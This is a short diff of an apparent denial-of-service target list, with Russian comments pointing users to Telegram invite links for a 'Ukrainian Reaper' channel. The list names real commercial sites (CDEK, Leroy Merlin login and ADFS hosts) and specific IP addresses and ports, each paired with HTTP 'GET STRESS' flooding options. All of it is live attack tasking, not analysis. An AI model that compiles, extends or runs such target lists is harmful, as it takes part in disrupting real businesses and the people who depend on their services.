@@ -1,7 +1,6 @@
 ### Цели выбираются и анонсируются в канале Украинский Жнец - https://t.me/+-GoGtA_IsOk3YmE6 чат - https://t.me/+sNy3N3b11_9mMDA6
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
-https://www.cdek.ru/ru https://cdek.by/ru/ --http-methods GET STRESS
-tcp://78.46.28.63:80 tcp://78.46.28.63:443 tcp://195.189.222.41:443 tcp://195.189.222.60:993
+https://www.cdek.ru/ru https://cdek.by/ru/ tcp://78.46.28.63:80 tcp://78.46.28.63:443 tcp://195.189.222.41:443 tcp://195.189.222.60:993 --http-methods GET STRESS
 
 https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru --http-methods GET STRESS
